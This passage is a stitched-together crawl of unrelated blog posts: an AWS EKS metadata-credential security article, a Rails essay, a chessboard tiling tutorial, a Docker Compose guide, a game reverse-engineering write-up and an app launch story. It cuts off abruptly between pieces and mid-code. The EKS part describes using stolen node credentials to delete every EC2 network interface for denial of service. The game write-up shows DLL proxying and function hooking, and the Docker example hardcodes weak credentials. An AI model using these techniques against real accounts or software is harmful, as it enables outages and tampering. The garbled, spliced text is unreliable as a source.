<ul><li>Map the network, by <strong>listing and describing VPCs, subnets, and security groups</strong>. Not only the VPC associated to the EKS cluster, but <em>across the whole AWS account.</em><br></li><li><strong>Describe <em>any EC2 instance</em></strong><em> in the AWS account.</em> This includes information such as the AMI used, private IP, disks attached…<br></li><li><strong>Nuke <em>all network interfaces</em></strong><em> of every EC2 instan</em>ce with successive calls to <em>ec2:DescribeNetworkInterfaces</em>, <em>ec2:DetachNetworkInterface</em>, and <em>ec2:DeleteNetworkInterface</em>. This will bring offline all your instances and dependent AWS managed services. Your fancy EKS cluster? Gone. Your highly-available, auto-scalable web application spanning in 3 AZs? Offline. Great attack vector for a denial of service.<br></li><li><strong>Enumerate and pull any Docker image</strong> (“<em>ECR repository</em>“) in the account. As a bonus, you can even query the image vulnerability scan results by calling <em>ecr:DescribeImageScanFindings</em>. This will give you a nice list of the vulnerabilities <a href="https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html">identified</a> by AWS in these images. This can be very helpful for further exploitation of pods inside the EKS cluster. Who needs Nessus anyway?</li></ul>



<p>Again, all this is <strong>AWS account-wide</strong>, comes by default when spinning up an EKS cluster, and is accessible by only having compromised a single, underprivileged pod in the cluster.</p>



<h2><span id="Remediation">Remediation</span></h2>



<p>This flaw is actually not new – it’s even <a href="https://docs.aws.amazon.com/eks/latest/userguide/restrict-ec2-credential-access.html">documented</a> by AWS, who suggests to block the Instance Metadata service by creating an iptables rule on every EKS worker node. This is rather impractical if your EKS nodes are managed by <a href="https://docs.aws.amazon.com/eks/latest/userguide/managed-node-groups.html">node groups</a>, dynamically spinning up EC2 instances to act as EKS worker nodes. You’d need to create a <a href="https://aws.amazon.com/blogs/containers/introducing-launch-template-and-custom-ami-support-in-amazon-eks-managed-node-groups/">custom node group launch template</a> or custom AMI.</p>



<p>Another option is to <strong>use Kubernetes network policies to block access to the Instance Metadata service</strong>. Unfortunately, the <a href="https://github.com/aws/amazon-vpc-cni-k8s">Kubernetes network plugin</a> that EKS uses does not natively support network policies. The recommended workaround is to add the Calico Network Policy provider, which will be able to pick up your network policy objects and apply them. Note that this is <span>not</span> a full new <a href="https://kubernetes.io/docs/concepts/cluster-administration/networking/">CNI plugin</a> for your cluster, just a “network policy enforcer” (<a href="https://www.projectcalico.org/calico-network-policy-comes-to-kubernetes/">Calico supports both modes.</a>)</p>



<p>Following the <a href="https://docs.aws.amazon.com/eks/latest/userguide/calico.html">AWS documentation</a>, we can install the Calico Network Policy provider on our cluster:</p>



<pre data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ kubectl apply -f https://raw.githubusercontent.com/aws/amazon-vpc-cni-k8s/release-1.6/config/v1.6/calico.yaml
# Wait for a few seconds...
$ kubectl get daemonset calico-node --namespace kube-system
NAME          DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR                 AGE
calico-node   1         1         1       1            1           beta.kubernetes.io/os=linux   17m</pre>



<p>Calico runs as a <a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/">DaemonSet</a>, making sure that each worker node has its own Calico pod, picking up network policy objects and applying them locally on the nodes with iptables.</p>



<p>We can now write our network policy filtering egress traffic. In its simplest form, we will allow any outbound traffic not directed to the Instance Metadata IP.</p>



<pre data-enlighter-language="yaml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">apiVersion: projectcalico.org/v3

<p><strong>Please Note: </strong><br></p>
<p>This boilerplate is a working game but it does require some knowledge of HTML, CSS, and JavaScript if you want to customize it, or a willingness to learn these technologies. If you need help learning there is an extended option you can select when you buy which includes <strong>one hour of video coaching</strong> to help you get started. There is also the YouTube screencast series (currently filming!) which you can follow along with.<br></p>
<p>Web app templates are often priced in the  $20 - $1000 range, but I wanted to make this accessible to roguelike game developers like myself at a reasonable price. <strong>If you're not completely satisfied with your purchase please make contact and you will get a full refund</strong>.<br></p>

<p>Hey I’m Ahmed, a self taught software engineer. In my path of self learning, I tried multiple languages and frameworks; and one of them was Ruby on Rails.</p>



<p>That was at least 5 years ago, and I hated it. I didn’t know why, but it just felt different in a bad way at that time.</p>



<p>A few years after, exactly 3 months ago, I started learning Ruby on Rails again. But this time I was shocked! Why didn’t I learn it before? Look at how things are easier here? Why are we spending so much time in other frameworks while this is working out of the box?…</p>



<h2>The hobby phase</h2>



<p>As a developer, you start your coding journey as a hobby. You discovered code and how you can turn your ideas to life. Now, you’re hooked. You spend a lot of time coding and working with technology! In fact, according to this <a href="https://insights.stackoverflow.com/survey/2019#developer-profile-_-coding-as-a-hobby">StackOverflow survey</a>, 80% of developers code as a hobby.</p>



<p>Before the technology boom, people used to hate their day job. It was a source of income so they can do other things on the side. But for code, it’s different. It’s a hobby <strong>and</strong> a daily job.</p>



<p>It’s a no brainer that, we as developers, tend to over-architect things, build things from scratch, re-invent the wheel, etc… It’s a hobby and we want to experience the most out of it. And as a fresh software engineer discovering this new hobby, you want languages and frameworks giving you more flexibility to create, architect, and play with technology.</p>



<p>You can spend hours trying to make two frameworks play nicely together. Create the perfect build process. Architect your todo app. Deploy your simple app to a multi-region cloud provider, etc. And in the end, you feel happy. You don’t feel like you wasted time, because it’s your hobby! And we don’t waste time on hobbies. They are a source of happiness.</p>



<p>You’re in the <strong>hobby phase</strong>. </p>



<hr>



<h2>The get-things-done phase</h2>



<p>As you get more experience in the field, you’re more likely move out of the hobby phase. This is due to different causes, and some of them are: </p>



<ul><li>You don’t have enough time outside work to play with code (family, children, other new hobbies…)</li><li>Your past experiences show it’s not worth it to spend so much time early on trying to optimize</li><li>You’re now happier to see a product launch more than the technology behind it</li><li>You have a broad knowledge about the product inside your organization</li><li>And others…</li></ul>



<p>As you reach this new phase, you do not care about frameworks and languages anymore. You want what gets the job done as your objectives are greater than the technology. You want a set of frameworks that plays nicely together and get the job done as quickly as possible. And that’s when you’ll find something like Ruby on Rails.</p>



<p>Ruby on Rails is a set of tools and frameworks that plays nicely together as long as you use what’s given to you. You don’t have the freedom to use new frameworks or build things the way you want. But if you abide by the Ruby on Rails rules, you’ll move faster.</p>



<p>You’re in the <strong>get-things-done phase</strong>. Being on the get-things-done phase <strong>is a prerequisite</strong> to liking Ruby on Rails. No one likes something that limits their “creativity” if they are still in the hobby phase. </p>



<p>According to the same <a href="https://insights.stackoverflow.com/survey/2019#experience">StackOverflow survey</a>, 67% of developers have less than 9 years of experience (40% have less than 5 years). That means, 67% are likely to be in the hobby phase. And this is one of the reasons why a lot of developers hate Ruby on Rails.</p>



<hr>



<h2>Skipping the hobby phase</h2>



<p>Being on the hobby phase isn’t bad. In your journey as a developer, you’ll start in the hobby phase. And with time, you’ll move slowly out of it. The timing it takes depends on each individual however.</p>



<p>But can you avoid it altogether? Yes, there are some exceptions. These are people coming from other disciplines. They are marketers, sales, and other non-technical people who discovered they can do more with code. <strong>Their primary objective isn’t to code. It’s to get help from code</strong>.</p>



<p>They are less likely to pick up new technologies or frameworks. They just want something that works and helps them in their job. They are more likely to pick something like Ruby on Rails. Or better, <strong>no-code tools</strong>.</p>

		Howdy 👋,

I’m Ahmed from Morocco and I build things using code, a.k.a a Software Engineer.

I hold an electrical engineering degree and I’m a self taught software developer. I figured out my love for building things when I started my first online business at the age of 17.

I blog at elazzabi.com and remote.ma.<br>

                    <p><strong><strong>The Defective Chessboard problem, </strong></strong>also known as the <strong><strong>Tiling Problem</strong></strong> is an interesting problem. It is typically solved with a “divide and conquer” approach. The algorithm has a time complexity of <strong><strong><em><em>O(n²)</em></em></strong></strong><em><em>.</em></em></p><h2 id="the-problem">The problem</h2><p>Given a <em><em>n </em></em>by <em><em>n</em></em> board where <em><em>n</em></em> is of form 2^k where k &gt;= 1 (Basically, n is a power of 2 with minimum value as 2). The board has one missing square). Fill the board using trionimos. A trionimo is an L-shaped tile is a 2 × 2 block with one cell of size 1×1 missing.</p><p>Solving the problem efficiently isn’t the goal of this post. Visualizing the board as the algorithm runs is much more interesting in my opinion, though. Lets discuss the algorithm first.</p><figure><img src="https://miro.medium.com/max/660/0*adonlEHar0FeZ3XM.png" alt="Image for post"><figcaption>The board with no defects added</figcaption></figure><h2 id="the-algorithm">The Algorithm</h2><p>As mentioned earlier, a divide-and-conquer (DAC) technique is used to solve the problem. DAC entails splitting a larger problem into sub-problems, ensuring that each sub-problem is an exact copy of the larger one, albeit smaller. You may see where we are going with this, but lets do it explicitly.</p><p>The question we must ask before writing the algorithm is: is this even possible? Well, yes. The total number of squares on our board is <em><em>n</em></em>², or 4^<em><em>k</em></em>. Removing the defect, we would have 4^<em><em>k</em></em> — 1, which is always a multiple of three. This can be proved with mathematical induction pretty easily, so I won’t be discussing it.</p><figure><img src="https://miro.medium.com/max/659/0*zOyl7BWBT9R4Csjd.png" alt="Image for post"></figure><h2 id="the-base-case">The base case</h2><p>Every recursive algorithm must have a base case, to ensure that it terminates. For us, lets consider the case when <em><em>n</em></em>, 2^<em><em>k</em></em> is 2. We thus have a 2×2 block with a single defect. Solving this is trivial: the remaining 3 squares naturally form a trionimo.</p><h2 id="the-recursive-step">The recursive step</h2><p>To make every sub-problem a smaller version of our original problem, all we have to do is add our own defects, but in a very specific way. If you take a closer look, adding a “defect” trionimo at the center, with one square in each of the four quadrants of our board, except for the one with our original defect would allow use to make four proper sub-problems, at the same time ensuring that we can solve the complete problem by adding a last trionimo to cover up the three pseudo-defective squares we added.</p><p>Once we are done adding the “defects”, recursively solving each of the four sub-problems takes us to our last step, which was already discussed in the previous paragraph.</p><h2 id="the-combine-step">The combine step</h2><p>After solving each of the four sub-problems and putting them together to form a complete board, we have 4 defects in our board: the original one will lie in one of the quadrants, while the other three were those we had intentionally added to solved the problem using <strong><strong>DAC</strong></strong>. All we have to do is add a final trionimo to cover up those three ‘defects’ and we are done.</p><p>Thus, the recursive equation for time complexity becomes:</p><p><strong><strong><em><em>T(n) = 4T(n/2)+c</em></em></strong></strong></p><p>The <strong><strong>4 </strong></strong>comes from the fact that to solve each problem of input n, we divide it into 4 sub-problems of input size <em><em>n/2 </em></em>(half the length of the original board). Once we are done solving those sub-problems, all that’s left to be done is to combine them: this is done by adding the last trionimo to cover up the pseudo-defects we added. This, of course, is done in constant time.</p><p>If you are interested in finding the asymptotic time complexity of the recurrence relation, you could try the <strong><strong>recursion tree method </strong></strong>or the <strong><strong>substitution method</strong></strong>. For now, lets just use the <strong><strong>Master theorem</strong></strong>.</p><p>The master theorem says that for a recurrence relation of the form:</p><p><strong><strong><em><em>T(n) = aT(n/b) + f(n)</em></em></strong></strong></p><p>the complexity depends on the complexities of<em><em> f(n) </em></em>and <em><em>n ^ log_b(a)</em></em> (the log is to the base <em><em>b</em></em>).</p><p>The cases in the image below tell us which case we need to use here.</p><figure><img src="https://miro.medium.com/max/1470/1*fPnVzEh00aTSG3PCX2MnXQ.png" alt="Image for post"><figcaption>The Master Theorem. From <a href="https://brilliant.org/wiki/master-theorem/" rel="noopener nofollow">brilliant.org</a></figcaption></figure><p>Since the value of n ^ log(a) base b is <em><em>n</em></em>², while the term <em><em>f(n) </em></em>is of constant complexity, we use <strong><strong>Case 1, </strong></strong>which ultimately tells us that our algorithm has an order of <strong><strong><em><em>n</em></em>²</strong></strong>. In other words, the time complexity of our algorithm is <strong><strong>O(<em><em>n</em></em>²).</strong></strong></p><h2 id="the-code">The Code</h2><p>Initially, each square is represented by a 0. A ‘-1’ represents a defective square, and would appear black in the plots. Each trionimo would be displayed with a unique number, which would be incremented as more trionimos are added.</p><p>Again, the goal of the code is not optimization — its to do as much from scratch (in plain python) as possible.</p><p>I have commented the code below, so it should be pretty straight-forward.</p><h3 id="importing-required-libraries">Importing required libraries</h3><pre><code>from random import randint

It's entirely hands-on.</p>
<p>Docker has made it easier to develop and package applications in reproducible environments. With Docker, you worry less about the infrastructure of your local machine and that of the production environment and worry more about worry about your code. Although a good product, sometimes when building you would want to run different parts of an application using Docker. What this means is you will create a couple of Dockerfiles and manage them. You <em>orchestrate</em> the containers yourself. This makes maintaining them both hectic and time-consuming. </p>
<p>Docker Compose is a tool used to run many Docker containers representing different parts of an application. To define and configure services (applications) with Compose, you use YAML files. The tool creates, starts, and stops these services that run as Docker containers. Docker Compose is great for rapid prototyping of microservices and continuous integration pipelines.</p>

<h2 id="sample-application">Sample Application</h2>
<p>Let's look at a docker-compose file with MYSQL configurations, call it <code>docker-compose.yml</code>. </p>
<pre><code>services:
  mysql:
    image: <span>"mysql:8.0"</span>
    container_name: mysql
    restart: always
    ports:
      - <span>"3300:3306"</span>

      - MYSQL_DATABASE=database
      - MYSQL_USER=user
      - MYSQL_PASSWORD=password1212
      - MYSQL_ALLOW_EMPTY_PASSWORD=yes
volumes:
  dbdata:
</code></pre><h3 id="explanation">Explanation</h3>
<p>The above YAML file has some things to note.</p>
<ul>
<li>A <em>service</em> called <code>mysql</code> is created, and it depends on the <code>mysql:8.0</code> published image on Docker Hub.</li>
<li>The local port <em>3300</em> maps to the container port 3306 to enable assess the MySQL container from the 3300 port. </li>
<li>The restart policy is set to always restart an exited container.</li>
<li>We define a docker volume which ensures data is persistent so we keep our data after the shut down of a container. It is important because Docker data is <em>ephemeral</em>.</li>
<li>Environment variables are also defined to adjust the configuration (login details) of the MySQL instance.</li>
</ul>
<h3 id="web-interaction">Web Interaction</h3>
<p>Flask microframework is used to interact with the database. To create this, follow the instructions below.</p>
<ul>
<li>Create a folder called <code>python</code> and change directories into it.</li>
<li>Create a file called <code>app.py</code> that connects with the MYSQL container and processes inputs</li>
</ul>
<pre><code><span>from</span> flask <span>import</span> Flask, render_template, request

<ul>
<li>The <em>build</em> directs docker to the folder(context) <code>python</code> and builds a docker image from the Dockerfile in the folder.</li>
<li>The <em>volume</em> is edited to initialize the MYSQL container with our <code>init.sql</code> file.</li>
</ul>
<p>The project should have the structure below:</p>
<pre><code>├── docker-compose.yml
├── init.sql
└── python
    ├── app.py
    ├── Dockerfile
    ├── index.html
    └── requirements.txt
</code></pre>
<p>The image below shows the block diagram of the docker-compose file.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598887228171/lgo8V7Bo4.png?auto=format&amp;q=60" alt="docker-compose.yml.png"></p>
<h3 id="execution">Execution</h3>
<p>To execute the above block, run <code>docker-compose up</code> on your terminal and access the HTML on <code>localhost:5000</code>.</p>
<h2 id="conclusion">Conclusion</h2>
<p>We have seen how Docker Compose works and some basic explanations. Things to note:</p>
<ol>
<li>Docker manages single containers while Docker Compose manages multiple container applications.</li>
<li>Docker Compose is good for development, testing, and staging environments but in a production environment, you would be better off using Kubernetes or Docker Swarm.</li>
<li>Environment variables and secrets are never checked into source control in a production setting. Use a <code>.env</code> file instead</li>
</ol>
<p><strong>Glossary</strong></p>
<p>ephemeral: lasting for a very short time. This means without volumes, data generated and in docker are volatile and will be lost on termination of a container (either a restart or a rebuild).</p>
<p>orchestrate: Container orchestration is the automatic process of managing or scheduling the work of individual containers for applications based on microservices within multiple clusters.</p>
<p>service: A service is a section that defines all the containers used by our application.</p>
<p>3300: The default port for connections should be port 3306, but for easier understanding of where local ports and container ports are in a file, 3300 is used. </p>

  <p>Great User Experience Design has become the driving force behind successful products – at the expense of happiness, mental health and purpose. It is time for UX design to step up and evolve. Johannes Ippen is a designer and author from Berlin. He is currently running Human Deluxe, an Experience Design Studio &amp; consultancy focusing on Human-Brand relations.</p>

<p>Prior to that, he was responsible for the Product Marketing at mobile games developer Wooga, creator of hit games such as Jelly Splash, Pearl’s Peril and Diamond Dash. As founder of the Thanksalot Design Collective, he has created and launched several successful products like the Aside Magazine, MagazineGrid and Graphical Cooking. Johannes has written four bestselling books about digital product design and development, published at Rheinwerk Verlag. He teaches UX design and information architecture at Design Akademie Berlin, where he also graduated in 2009.</p>

<p>The native Berliner likes French punk rock, well-designed infographics (preferably about food) and really strong espresso. This talk was given at a TEDx event using the TED conference format but independently organized by a local community.

<p>During these past two weeks I had the chance to play the Marvel’s Avengers Beta. The game allows the player to player solo or hop into matchmaking to find some squad-mates.
Even playing solo it was clear that the game needed internet connectivity. Having already played last week during the closed-beta I decided to use the new open-beta to explore more about the game’s networking.</p>



<p>One of the reasons I like reversing and understanding client/server communications is that the process is much more clear than other types of reversing, such as custom archives and formats.
The process goes like this:</p>

<ol>
  <li>Understand the type, the sender and destination of the traffic - who is responsible of sending it, whether it’s UDP/TCP, the endpoints, is it encrypted? …</li>
  <li>Acquire readibility and instrumentation - develop/use tools to dump the traffic to later analyze it</li>
  <li>Learn the protocol details - crucial for debugging, this can be done by omitting requests/responses, messing with the contents,…</li>
</ol>

<p>If the goal is to develop an emulator then there’s extra steps:</p>

<ol>
  <li>Start by parroting the server responses</li>
  <li>Slowly build the backend and start making your own responses</li>
</ol>

<h2 id="understanding-the-traffic">Understanding the traffic</h2>

<p>I started by opening <code>Wireshark</code> and checking how my actions impact the traffic. During the game’s boot there’s nothing happening, pressing the <code>Start</code> button in the main menu the game performs a DNS query of <code>cry-trmv6-beta.os.eidos.com</code> followed by setting up a TLS connection to the return IP. This indicates that the protocol being HTTPS - it’s nice since it well known but it’s encrypted which hurts readibility and tamperability.</p>

<p>Having some experience with games that use HTTPS, such as <a href="https://github.com/krystalgamer/shakes_fidget_server_emulator">Shakes and Fidget</a>, it’s common for the client not to care about the server being HTTP(useful for dumping packets) or even the server allowing HTTP requests. I added an entry to the <code>HOSTS</code> file to redirect the traffic to my local server sadly the connection couldn’t be established and Square Enix servers only allowed HTTPS. This meant I had to dug deeper to acquire reading power of the packets.</p>

<p>This part got me scared since the game uses Denuvo which contributes to its 400MB of executable size. I wanted to avoid messing its anti-tamper measures.
To verify where the traffic comes from within the game using <code>x64dbg</code> I placed a breakpoint at <code>getaddrinfo</code> in <code>ws2_32.dll</code>. When the breakpoint was hit reading the callstack showed where it came from, it was <code>osdk.dll</code>. This module was shipped with the game and until that moment I was not aware of its existence.</p>

<p>The next step was to see what it exports:</p>

</code></pre></div></div>

<p>Some of the entries were removed due to being too long. This was my breakthrough, this library is responsible for the communications and it appears to be done in JSON!</p>

<p>Digging around the <strong>strings</strong> I noticed it was using <code>libcurl</code> which is also awesome, but also <code>libuv</code> which could pose serious problems for debugging and tracing. IDA wasn’t picking cURL’s function names so I had to use one of the community FLIRT databases, <a href="https://krystalgamer.github.io/avengers-emulator/%3Chttps://github.com/Maktm/FLIRTDB">FLIRTDB</a>, which was key in finding functions such as <code>curl_easy_setopt</code>.
cURL has two interfaces the <code>easy</code> and the <code>multi</code>, the latter being focused in asynchronous programming. Even though it uses <code>libuv</code> all the connections are done via the <strong>easy</strong> interface.</p>

<p>Having the targets isolated it was time to add some logging. In this case I resorted to dll proxying which consists of substituting the original module with a one created by me and redirecting all the calls to the original one. Microsoft Visual C compiler makes it super easy with a simple pragma directive.</p>

<div><div><pre><code> <span>__pragma</span> <span>(</span><span>comment</span> <span>(</span><span>linker</span><span>,</span> <span>"/export:"</span> <span>export_name</span> <span>"="</span> <span>original_dll_name</span><span>.</span><span>export_name</span> <span>",@"</span> <span>ordinal</span><span>))</span>
</code></pre></div></div>

<p>In this case I renamed <code>osdk.dll</code> to <code>osdk_orig.dll</code>, the new module exported the exact same functions which just forwarded to the original.</p>

<div><div><pre><code><span>#define FORWARDED_EXPORT_WITH_ORDINAL(exp_name, ordinal, target_name) __pragma (comment (linker, "/export:" #exp_name "=" #target_name ",@" #ordinal))
</span>
<span>FORWARDED_EXPORT_WITH_ORDINAL</span><span>(</span><span>osdk_Allocator_Free</span><span>,</span> <span>1</span><span>,</span> <span>osdk_orig</span><span>.</span><span>osdk_Allocator_Free</span><span>)</span>
<span>FORWARDED_EXPORT_WITH_ORDINAL</span><span>(</span><span>osdk_Allocator_Init</span><span>,</span> <span>2</span><span>,</span> <span>osdk_orig</span><span>.</span><span>osdk_Allocator_Init</span><span>)</span>

<span>(...)</span>
</code></pre></div></div>

<p>DLL Proxying has also another big advantage, since <code>DllMain</code> runs before the main executable(the ones of the modules that are explicitly imported!), it’s the safest place to perform any hooks/patches. Other methods such as DLL Injection require creating an extra thread which might cause some racing issues.</p>

<p>Here I run into another problem, for some reason <code>GetModuleHandle</code> was always returning 0, except when the argument was <code>NULL</code>. Calling <code>ntdll!LdrGetDllHandle</code> also yielded 0 and even walking the LDR table from PEB(Process Environment Block), yield no modules which was extremely suspicious.</p>

<p>I was eager to to get my hooks running and debugging Windows internal structures was not on my best interest, because it might be caused by Denuvo! Being desperate I decided to try something that even <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices">Microsoft discourages</a> from doing, calling <code>LoadLibrary</code> in <code>Dllmain</code>, the reason behind it is that it during the <code>DllMain</code> routine the loader lock is acquired and is not free’d until it’s over(also the loaded modules list must not change inside), thus loading new modules might cause crashes or deadlock.</p>

<p>Since my dll depends on <code>osdk_orig.dll</code> then it must be loaded after the original one, thus my call of <code>LoadLibrary</code> does not violate the condition of modifying the module list! Luckily it worked and <code>GetProcAddress</code> was also working. Using <code>osdk_Allocator_Init</code> as a pivot, the <strong>offsets</strong> to all the relevant functions inside <code>osdk_orig.dll</code> were calculated and relevant functions hooked. It was time to start logging!</p>

<h3 id="logging-curl_easy_setopt">Logging curl_easy_setopt</h3>

<p>Performing requests with cURL is quite straightforward, first create a <code>CURL*</code> handle with <code>curl_easy_init</code> and then set <strong>ALL</strong> connection related settings/parameters <code>curl_easy_setopt</code>. The function prototype is as follows:</p>

<div><div><pre><code><span>CURLcode</span> <span>curl_easy_setopt</span><span>(</span><span>CURL</span> <span>*</span><span>handle</span><span>,</span> <span>CURLoption</span> <span>option</span><span>,</span> <span>parameter</span><span>);</span>
</code></pre></div></div>

<p>The first argument was already discussed, the second one is an <em>enum</em> which specifies which option will be set and the third argument is the data related to the parameter. E.g with option <code>CURLOPT_URL</code> the parameter would be a null-terminated string of the url.</p>

<p>Hooking this function was done with a <strong>trampoline</strong>, which consists of over-writing the function prologue with something like this:</p>

<div><div><pre><code><span>mov</span> <span>rax</span><span>,</span> <span>ADDRESS_OF_…</span></code></pre></div></div></div></div>

<div>
<p>How do small, <a href="https://www.investopedia.com/terms/b/bootstrap.asp">bootstrapped</a> companies launch new products? It depends, but I want to tell about Gikken's journey from buying the iconic Mac app for iOS + macOS developers, to conducting user interviews, to designing a new version from scratch, to deciding on pricing, and to prepping for launch day.</p><figure><img src="https://blog.gikken.co/content/images/2020/08/confetti-cover-6.png"></figure><p>8 months ago, I shared exciting news that <a href="https://blog.gikken.co/we-acquired-tokens/">we bought Tokens</a> from another developer. Being a financially successful indie developer focused on language learning tools, we felt that we wanted to try a new area, to solve problems for a new community. When I started using Twitter over a year ago, I figured out that Gikken's brand had been underrepresented in the developer community, being a 5-year-old company. Could there have been a better match than to make a product for developers? We didn't think long when an opportunity to acquire Tokens popped up.</p><p><strong>Today, I'm thrilled to announce that Tokens 2 is out. </strong>It's an all-new version of the app that was once a marketing and customer support powerhouse for thousands of Apple developers.</p><h2 id="acquisition">Acquisition</h2><p>I discovered Tokens last year—later than most Apple developers. It was love at first sight. Having promo codes always at hand saved me hours of customer support work. Redemption notifications triggered dopamine even when redeemed by ordinary users, let alone popular bloggers!</p><figure><img src="https://blog.gikken.co/content/images/2020/08/Notifications.png"><figcaption>Redemption notifications are one of the best Tokens features according to me and some other people.</figcaption></figure><p>Gikken-owned Tokens happened quickly–it amazes me. I asked whether <a href="https://twitter.com/denishennessy">Denis</a> planned to make an iOS app. He replied maybe, Andrew and I offered to partner up and make it together, and Denis got back offering all the rights to it.</p><p>It took us one call to decide. Denis turned out to be a super friendly guy living close to Dublin, Ireland and making apps for a living for over 10 years. He said he took over Tokens from another developer, <a href="https://supertop.co/">Supertop</a>. 7 years after the app was first released, it hadn't brought in any revenue. Denis said he didn't do any marketing and Tokens's monetization model was the worst imaginable fit for a small B2B market—low-hanging fruit. We decided to give it a shot. Money aside, it was an amazing opportunity to spread the word about Gikken among developers.</p><p>A few days later, we signed a one-page agreement. We have never mentioned it but Denis threw another project into the deal: <a href="http://tophatapp.com/">Top Hat</a>. We'd acquired two products. After we wired the money, Denis messaged me on Christmas eve to say he had free time and could hand over access to all repositories and accounts. I was in the office, why not. Gikken took full ownership of Tokens on December 25th, 2019!</p><h2 id="interviewing-old-users">Interviewing old users</h2><div><p>Even though to us it was obvious that Tokens had to be able to generate promo codes for IAP in 2020, we wouldn't have jumped on it if people hadn't cared about it. "Winners learn from losing," yet doing something that no one cares about demotivates even the winners.</p><p>The best way to figure out if people care is through user interviews. I had to interview app developers to figure out: how often they use promo codes, for what, how much of a pain was App Store Connect, would they be ready to pay for it, and how much. Andrew once sent me a copy of <a href="https://www.amazon.com/gp/product/1492180742/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=1492180742&amp;linkCode=as2&amp;tag=gikken-20&amp;linkId=a3a25b00a364100a35875a4991ae47f6">The Mom Test</a>–one of the best business books I've read. It teaches you how to conduct interviews that won't give you false hopes.</p></div><p>It wasn't hard to find people for interviews. Denis handed us over the full list of everyone who's ever purchased a Tokens license. No one can tell you more than someone who's purchased a product once. They know whether their workflow became better with Tokens and whether it was worth the money.</p><p>It was fun looking through the list. Surprising that a lot of iconic developers were among users. Developers of Flighty, Things, Pixelmator, Waterminder, Fantastical, and 1,000+ others once believed that Tokens could improve their workflow. In early January, poking around the old customer list replaced Instagram as a way of procrastination.</p><p>I started timidly approaching people I'd heard the most about. I thought why the heck not, they might ignore me or not, at least I can say I tried. To my surprise, everyone who I was reaching out to ecstatically got back to me.</p><p>The first interview was with <a href="https://blog.gikken.co/p/f56ce6e9-26f9-4640-a21b-b9f4adc59378/twitter.com/rjonesy">Ryan Jones</a> from Flighty and Weather Line, which was a goldmine of insight and motivation. Tokens 1 didn't support promo codes for IAP. All Ryan's apps are freemium, however, he was an active Tokens user. He was pulling codes from ASC and inserting them into the app manually to have nice tokn.co links and redemption notifications.</p><p>I could tell Ryan was interested in Tokens's future by the amount of his questions. It was me trying to figure out how he uses promo codes and it was him trying to figure out what would happen with his favorite product.</p><p>When I started using Tokens, I instantly noticed that I was missing it when I was away from my Mac. I couldn't generate a code to quickly share with someone on Twitter. We discussed the idea of making an iOS app with Andrew even before we finalized our deal with Denis.</p><p>Ryan told the same. I felt relieved when I heard that my experiences align with those of a another user. I told him about our plans: that Tokens 2 might be a cross-platform app that would synchronize via a Tokens Account and that you would use Sign in with Apple. He asked about privacy. I said <a href="https://gikken.co/tokens/security/">Gikken's adamant about it</a> and that we would never store user credentials on our end—due to lack of the official App Store Connect API, we have to use user's Apple ID to make requests for pulling codes from Apple. He was excited. Following the call, Ryan kept helping us to shape the pricing strategy and UX.</p><p>I held around 15 interviews with users of the old Tokens in January. I approached people who I'd heard about because they were pretty influential in the community or those who were using desperately-outdated Tokens 1. I brushed up on my SQL skills to pull a list of them from the DB. A few generously agreed to jump on an hour-long call with me and others answered my questions in details over email. It provided a boatload of feedback and insights that we then had to process and shape into Tokens 2. All interviewees are now featured on our <a href="https://gikken.co/tokens/credits/">Credits</a> page.</p><p>There were people who said they didn't need it anymore or that they'd quit the app business. Many things can happen in 8 years. We had a strong impression that, all-in-all, Tokens was a much needed tool. As I mentioned before, reviving a once cult-like product would go hand-in-hand with working with the amazing community in which we wanted to be more recognized. We had to relaunch Tokens with long-overdue features, rethink the pricing model to make it viable, and finally convince the community that were the right company to do so.</p><h2 id="before-doing-work">Before doing work</h2><p>We did planning and thinking. Do we need to rewrite the app from scratch or slap new features on top of what we'd inherited from two prior developers? How much should it cost? Does it need to be on the App Store?</p><h3 id="app-store-vs-self-distribution">App Store vs self-distribution</h3><ul><li><strong>30% cut + taxes</strong> would mean we have to give up half of our revenue, which would barely make it viable again. In interviews, developers were pretty aligned on all things pricing–something between 5 and 10 dollars per month was fair to them. Considering the small market, getting 2.5 dollars out of 5 didn't feel like a fair justification for spending resources of the redesign and maintenance. </li><li><strong>App Store invoices are bad.</strong> Developers have registered businesses. They need to submit invoices to their tax offices. We do it every month and we understand the importance of unobtrusive, easy-to-find invoicing.</li><li><strong>It wouldn't give us any spotlight value</strong> that Apple claims to give. Who on earth would look for a better promo code management system (we checked–no one). It's not an obvious thing that people learn about via word-of-mouth and it's not something they open the App Store for.</li></ul><p>We went with <a href="https://paddle.com/">Paddle</a>. We've been selling <a href="https://gikken.co/mate-translate/mac/">Mate</a> with them for a while and it's proved itself as a perfect solution for selling Mac apps, plus it handles taxes, invoices, and licenses for you at a modest 5% cut.</p><p>If we were to port Tokens to iOS, we'd have to use the App Store. The whole Tokens for iOS story was pretty controversial from the beginning because it was giving access to Apple services without their approval (remember, there's no App Store Connect API). Chances they'd reject us were pretty high. We thought we'd test the waters by trying to submit Tokens 1 to the Mac App Store. It would have required poking around the old ObjC code and sandboxing it—we never went through with it. Instead, I got reassured by Ariel from <a href="https://blog.gikken.co/p/f56ce6e9-26f9-4640-a21b-b9f4adc59378/appfigures.com">Appfigures</a> and <a href="https://twitter.com/VadimShpakovski">Vadim</a> from <a href="http://nativeconnect.app/">NativeConnect</a> who successfully made it to the store with their apps that did the same thing as Tokens–use App Store Connect in a way not approved by Apple. A positive App Store review is an approval, isn't it?</p><p>The iOS app would rely on the Mac app in a way that it'd be a "reader app". You'd manage your subscription and create a Tokens account via Mac app, and the iOS app would allow you to sign in with Apple to your existing Tokens account and have access to your promo codes and generate new ones. Sounds like a perfect Netflix-Spotify-inspired 30% cut avoiding scheme for a service that doesn't need App Store's spotlight value that Apple claims to provide.</p><h3 id="from-the-ground-up">From the ground up?</h3><p>It was up to Andrew who's written almost all the code for Tokens 2. Since the original Tokens was written in Objective-C (we entered the app business when Swift was 